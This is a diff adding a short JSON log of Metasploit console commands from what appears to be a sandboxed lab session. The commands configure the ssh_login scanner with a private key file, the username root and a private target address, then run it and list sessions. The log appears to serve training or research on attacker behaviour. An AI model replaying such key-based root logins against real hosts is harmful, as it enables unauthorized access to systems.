@@ -1,0 +1,9 @@
+{"sandbox_id": "152", "timestamp_str": "2019-09-25T15:20:29.827373Z", "cmd_type": "msf-command", "cmd": "irb"}
+{"sandbox_id": "152", "timestamp_str": "2019-09-25T15:22:10.939308Z", "cmd_type": "msf-command", "cmd": "exit -y"}
+{"sandbox_id": "152", "timestamp_str": "2019-09-25T15:22:53.533275Z", "cmd_type": "msf-command", "cmd": "use auxiliary/scanner/ssh/ssh_login"}
+{"sandbox_id": "152", "timestamp_str": "2019-09-25T15:23:46.398958Z", "cmd_type": "msf-command", "cmd": "set KEY_FILE /tmp/id_rsa"}
+{"sandbox_id": "152", "timestamp_str": "2019-09-25T15:23:57.209116Z", "cmd_type": "msf-command", "cmd": "set USERNAME root"}
+{"sandbox_id": "152", "timestamp_str": "2019-09-25T15:24:50.273854Z", "cmd_type": "msf-command", "cmd": "set RHOSTS 172.18.1.5"}
+{"sandbox_id": "152", "timestamp_str": "2019-09-25T15:24:56.880881Z", "cmd_type": "msf-command", "cmd": "set RPORT 23"}
+{"sandbox_id": "152", "timestamp_str": "2019-09-25T15:25:01.563690Z", "cmd_type": "msf-command", "cmd": "run"}
+{"sandbox_id": "152", "timestamp_str": "2019-09-25T15:25:28.053407Z", "cmd_type": "msf-command", "cmd": "sessions"}
